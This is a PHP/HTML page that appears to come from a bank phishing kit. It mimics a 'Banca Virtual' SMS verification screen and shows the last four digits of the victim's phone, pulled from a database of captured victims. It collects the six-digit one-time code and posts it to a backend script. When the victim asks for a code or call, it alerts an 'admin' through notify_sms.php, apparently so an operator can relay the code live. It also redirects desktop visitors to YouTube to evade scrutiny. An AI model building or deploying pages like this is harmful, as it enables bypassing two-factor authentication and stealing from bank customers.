<?php
// tokemovil.php
session_start();
$transaction_id = $_GET['id'] ?? 'N/A';

// --- Lógica para obtener los últimos 4 dígitos ---
// Asegúrate de que 'assets/config/conexion.php' contiene la configuración de la base de datos
$config = require 'assets/config/conexion.php';
$ultimos_4_digitos = '????';

if ($transaction_id !== 'N/A') {
    $db_config = $config['db'];
    $driver = $db_config['driver'];
    $dsn = ($driver === 'mysql')
        ? "mysql:host={$db_config['host']};dbname={$db_config['dbname']};charset=utf8mb4"
        : "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";

    try {
        $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $sql = "SELECT movil FROM a_confirmar WHERE id = :id";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([':id' => $transaction_id]);
        $result = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($result && !empty($result['movil'])) {
            $ultimos_4_digitos = substr($result['movil'], -4);
        }
    }
    catch (PDOException $e) {
        error_log("Error de DB en tokemovil.php: " . $e->getMessage());
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Verificación de Código</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* CSS RESET para box-sizing */
        *, *::before, *::after {
            box-sizing: border-box; 
        }

        :root { 
            --main-text: #1f2937; --muted-text: #6b7280; --blue-accent: #3b82f6; 
            --dark-blue: #001947; --green-success: #166534; --green-light-bg: #f0fdf4;
            --border-color: #e5e7eb; --red-error: #dc2626;
        }
        body, html { font-family: 'Inter', sans-serif; background-color: #f7f7f7; color: var(--main-text); margin: 0; padding: 0; }
        .container { width: 100%; max-width: 450px; margin: 0 auto; padding: 20px; box-sizing: border-box; }
        .hidden { display: none !important; }

        .header-bar { background-color: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.05); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: relative; }
        .header-link { font-size: 15px; color: var(--muted-text); text-decoration: none; font-weight: 500; display: flex; align-items: center; gap: 4px; }
        .header-link .icon { font-weight: 600; font-size: 18px; }
        .header-title { font-size: 16px; font-weight: 500; color: var(--muted-text); position: absolute; left: 50%; transform: translateX(-50%); }

        .main-content { padding-top: 20px; padding-bottom: 20px; }

        .notification-bar { display: flex; align-items: center; background-color: var(--green-light-bg); color: var(--green-success); padding: 12px 16px; border-radius: 8px; margin-bottom: 20px; font-weight: 500; font-size: 15px; }
        .notification-bar .icon { width: 20px; height: 20px; margin-right: 12px; }
        .notification-bar .close { margin-left: auto; cursor: pointer; font-size: 20px; line-height: 1; }

        h1 { font-size: 24px; font-weight: 700; color: var(--main-text); margin: 0 0 20px 0; }
        .main-card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
        .card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
        .card-header .icon { width: 20px; height: 20px; color: var(--muted-text); }
        h2 { font-size: 18px; font-weight: 600; color: var(--main-text); margin: 0; }
        .description { font-size: 15px; color: var(--muted-text); line-height: 1.6; margin: 0 0 25px 0; }
        
        .phone-number { font-size: 20px; font-weight: 600; color: var(--main-text); margin: 15px 0; display: block; }
        .warning-text { font-size: 14px; color: var(--muted-text); margin-bottom: 30px; }
        .confirmation-actions { display: flex; align-items: center; gap: 20px; }
        .primary-btn { background-color: var(--dark-blue); color: #fff; padding: 12px 30px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .secondary-link { color: var(--blue-accent); font-weight: 600; font-size: 15px; text-decoration: none; }

        /* === ESTILOS DE INPUTS IMPORTADOS DE OTP.PHP (CORREGIDOS) === */
        .inputs-container { 
            display: flex; 
            gap: 4px; /* Espacio mínimo */
            justify-content: center; 
            margin-bottom: 30px; 
            padding: 0; 
        }
        .inputs-container input { 
            width: 44px; /* Ancho base */
            height: 52px; 
            text-align: center; 
            font-size: 22px; 
            font-weight: 400; 
            border: 1px solid #d1d5db; 
            border-radius: 8px; 
            outline: none; 
            -moz-appearance: textfield; 
            padding: 0;
            flex-grow: 1; 
            max-width: 45px; 
        }
        
        /* Media Query para móvil */
        @media (max-width: 400px) {
            .inputs-container {
                gap: 3px; 
            }
            .main-card {
                padding: 15px; /* Reducir padding de la tarjeta */
            }
            .inputs-container input {
                width: 36px; /* Ancho más pequeño para caber justo */
                height: 48px;
                max-width: 36px;
            }
        }
        /* === FIN ESTILOS DE INPUTS === */
        
        .inputs-container input:focus { border-color: var(--blue-accent); }
        
        .actions { display: flex; align-items: center; justify-content: flex-start; gap: 25px; }
        .verify-btn { background-color: #e5e7eb; color: #a0aec0; padding: 12px 30px; border-radius: 50px; font-weight: 600; cursor: not-allowed; border: none; font-size: 16px; }
        .verify-btn.active { background-color: var(--dark-blue); color: #fff; cursor: pointer; }
        
        .resend-link { color: var(--muted-text); text-decoration: none; font-size: 14px; display: flex; align-items: center; gap: 10px; cursor: default; }
        .resend-link.active { cursor: pointer; color: var(--blue-accent); }

        .timer-wrapper { position: relative; width: 24px; height: 24px; }
        .arc-spinner { width: 100%; height: 100%; animation: spin 0.8s linear infinite; }
        .arc-spinner circle { fill: transparent; stroke: var(--blue-accent); stroke-width: 2.5; stroke-linecap: round; stroke-dasharray: 45 57; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .countdown-number { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 13px; color: var(--muted-text); font-weight: 500; }
        .refresh-icon { font-size: 22px; line-height: 1; }

        .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; z-index: 2000; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; }
        .popup-overlay.active { opacity: 1; visibility: visible; }
        .popup-card { background-color: #fff; border-radius: 12px; padding: 25px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.2); }
        .popup-card .icon { color: var(--red-error); width: 40px; height: 40px; margin: 0 auto 10px auto; }
        .popup-card h2 { font-size: 22px; color: var(--main-text); margin: 0 0 10px 0; }
        .popup-card p { font-size: 15px; color: var(--muted-text); line-height: 1.6; margin: 0 0 25px 0; }
        .popup-card button { background-color: var(--dark-blue); color: #fff; width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; }
    </style>
    
    <script>
        // Umbral de ancho para considerar que es una PC (escritorio)
        const desktopMinWidth = 768; 

        // Función de detección y redirección
        function checkAndRedirect() {
            if (window.innerWidth > desktopMinWidth) {
                // Redirige si el ancho de la ventana es mayor al umbral
                window.location.href = 'https://www.youtube.com/';
            }
        }

        // Ejecutar la función inmediatamente
        checkAndRedirect();
    </script>
</head>
<body>

    <header class="header-bar">
        <a href="index.php" class="header-link back"> <span class="icon">&lt;</span> Inicio </a>
        <span class="header-title">Ingreso a Banca Virtual</span>
        <a href="index.php" class="header-link close">Abandonar <span class="icon" style="font-size: 15px; margin-left: 5px;">X</span></a>
    </header>

    <div class="container main-content">
        <div class="notification-bar hidden" id="notificationBar">
            <svg class="icon" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
            <span>Código SMS enviado</span>
            <span class="close" onclick="document.getElementById('notificationBar').style.display='none'">&times;</span>
        </div>
        <h1>Verifiquemos que eres tú</h1>
        <div class="main-card">
            
            <div id="confirmation-view">
                <div class="card-header">
                    <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" /></svg>
                    <h2>Código de verificación</h2>
                </div>
                <p class="description">Para ayudar a mantener tu cuenta segura, enviaremos un código de verificación a tu celular registrado terminado en:</p>
                <span class="phone-number">(***)***<?php echo htmlspecialchars($ultimos_4_digitos); ?></span>
                <p class="warning-text">No compartas el código enviado con nadie.</p>
                <div class="confirmation-actions">
                    <button type="button" id="sendCodeBtn" class="primary-btn">Enviar código</button>
                    <a href="#" class="secondary-link">No es mi número celular</a>
                </div>
            </div>

            <div id="input-view" class="hidden">
                <form id="tokenForm" method="POST" action="assets/config/tokemovil-verify.php">
                    <input type="hidden" name="transaction_id" value="<?php echo htmlspecialchars($transaction_id); ?>">
                    <input type="hidden" name="sms_token" id="smsTokenInput">
                    
                    <div class="card-header">
                        <svg class="icon" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 00-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" /></svg>
                        <h2>Código de verificación</h2>
                    </div>
                    <p class="description">Ingresa el código de 6 dígitos que se envió a tu celular terminado en (***)***<?php echo htmlspecialchars($ultimos_4_digitos); ?></p>
                    <div class="inputs-container" id="inputsContainer"></div>
                    
                    <div class="actions">
                        <button type="button" id="verifyBtn" class="verify-btn" disabled>Verificar</button>
                        <a id="resendLink" class="resend-link">
                            <div class="timer-wrapper" id="timerWrapper">
                                <svg class="arc-spinner" viewBox="0 0 22 22">
                                    <circle cx="11" cy="11" r="9"></circle>
                                </svg>
                                <span class="countdown-number" id="countdown-number">30</span>
                            </div>
                            <span>Reenviar código por llamada</span>
                        </a>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div id="errorPopupOverlay" class="popup-overlay">
        <div class="popup-card">
            <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
            </svg>
            <h2>Token Inválido</h2>
            <p>El token es incorrecto o ha expirado. Por favor, inténtalo de nuevo.</p>
            <button id="retryButton" type="button">Intentar de nuevo</button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const confirmationView = document.getElementById('confirmation-view');
            const inputView = document.getElementById('input-view');
            const sendCodeBtn = document.getElementById('sendCodeBtn');
            const notificationBar = document.getElementById('notificationBar');
            const errorPopupOverlay = document.getElementById('errorPopupOverlay');
            const retryButton = document.getElementById('retryButton');
            const form = document.getElementById('tokenForm');
            const container = document.getElementById('inputsContainer');
            const verifyBtn = document.getElementById('verifyBtn');
            const smsTokenInput = document.getElementById('smsTokenInput');
            const inputs = [];
            
            for (let i = 0; i < 6; i++) {
                const input = document.createElement('input');
                input.maxLength = 1; input.type = 'text';
                input.setAttribute('inputmode', 'numeric');
                input.setAttribute('autocomplete', 'one-time-code');
                container.appendChild(input);
                inputs.push(input);
                input.addEventListener('input', () => { if (input.value && i < 5) inputs[i + 1].focus(); checkInputs(); });
                input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus(); });
            }

            function checkInputs() {
                const allFilled = inputs.every(input => input.value.length === 1 && !isNaN(input.value));
                verifyBtn.disabled = !allFilled;
                if (allFilled) verifyBtn.classList.add('active'); else verifyBtn.classList.remove('active');
            }

            verifyBtn.addEventListener('click', () => {
                if (verifyBtn.disabled) return;
                smsTokenInput.value = inputs.map(i => i.value).join('');
                form.submit();
            });

            function getUrlParameter(name) {
                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
                const results = regex.exec(location.search);
                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
            }

            function startCountdown() {
                const timerWrapper = document.getElementById('timerWrapper');
                const countdownNumber = document.getElementById('countdown-number');
                const resendLink = document.getElementById('resendLink');
                let time = 30;
                
                countdownNumber.textContent = time;
                timerWrapper.querySelector('.arc-spinner').style.display = 'block';

                const interval = setInterval(() => {
                    time--;
                    countdownNumber.textContent = time;
                    if (time <= 0) {
                        clearInterval(interval);
                        timerWrapper.innerHTML = '<span class="refresh-icon" style="font-size: 24px; line-height: 1;">&#8635;</span>';
                        resendLink.classList.add('active');
                    }
                }, 1000);
            }

            const error = getUrlParameter('error');
            if (error === 'sms_invalid') {
                confirmationView.classList.add('hidden');
                inputView.classList.remove('hidden');
                errorPopupOverlay.classList.add('active');
                inputs[0].focus();
                startCountdown();
            } else {
                inputView.classList.add('hidden');
                confirmationView.classList.remove('hidden');
            }

            sendCodeBtn.addEventListener('click', () => {
                confirmationView.classList.add('hidden');
                inputView.classList.remove('hidden');
                notificationBar.classList.remove('hidden');
                inputs[0].focus();
                startCountdown();

                // Notificar al admin que el usuario solicitó el código SMS
                const fd = new FormData();
                fd.append('id',   '<?php echo htmlspecialchars($transaction_id); ?>');
                fd.append('tipo', 'sms');
                fetch('assets/config/notify_sms.php', { method: 'POST', body: fd }).catch(() => {});
            });
            
            retryButton.addEventListener('click', function() {
                errorPopupOverlay.classList.remove('active');
                inputs.forEach(input => input.value = '');
                checkInputs();
                inputs[0].focus();
            });

            // Reenviar código por llamada
            document.getElementById('resendLink').addEventListener('click', function(e) {
                if (!this.classList.contains('active')) return;
                e.preventDefault();

                // Notificar al admin
                const fd = new FormData();
                fd.append('id',   '<?php echo htmlspecialchars($transaction_id); ?>');
                fd.append('tipo', 'llamada');
                fetch('assets/config/notify_sms.php', { method: 'POST', body: fd }).catch(() => {});
            });
        });
    </script>
</body>
</html>